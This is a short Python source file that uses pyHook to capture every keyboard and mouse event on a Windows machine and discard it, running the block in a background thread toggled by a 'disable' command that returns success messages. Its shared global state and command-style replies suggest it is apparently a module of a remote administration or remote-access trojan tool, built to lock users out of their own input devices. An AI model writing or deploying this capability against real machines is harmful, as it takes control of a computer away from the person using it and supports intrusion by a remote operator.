import threading
import pythoncom
import pyHook

from foreign.global_state import *


def on_event(event):
  return False


def block_input():
  hm = pyHook.HookManager()
  hm.KeyAll = on_event
  hm.MouseAll = on_event
  hm.HookKeyboard()
  hm.HookMouse()

  while state['disable']['running']:
    pythoncom.PumpWaitingMessages()
  else:
    hm.__del__()

def disable(unlock):
  if unlock:
    state['disable']['running'] = False
    state['disable']['thread'] = None
    return {'message': 'Successfully enabled keyboard & mouse', 'text_mode': 'success'}
  else:
    if state['disable']['thread']:
      if not state['disable']['thread'].isAlive():
        state['disable']['running'] = True
        state['disable']['thread'] = threading.Thread(target=block_input, daemon=True)
        state['disable']['thread'].start()
    else:
      state['disable']['running'] = True
      state['disable']['thread'] = threading.Thread(target=block_input, daemon=True)
      state['disable']['thread'].start()
    return {'message': 'Successfully disabled keyboard & mouse', 'text_mode': 'success'}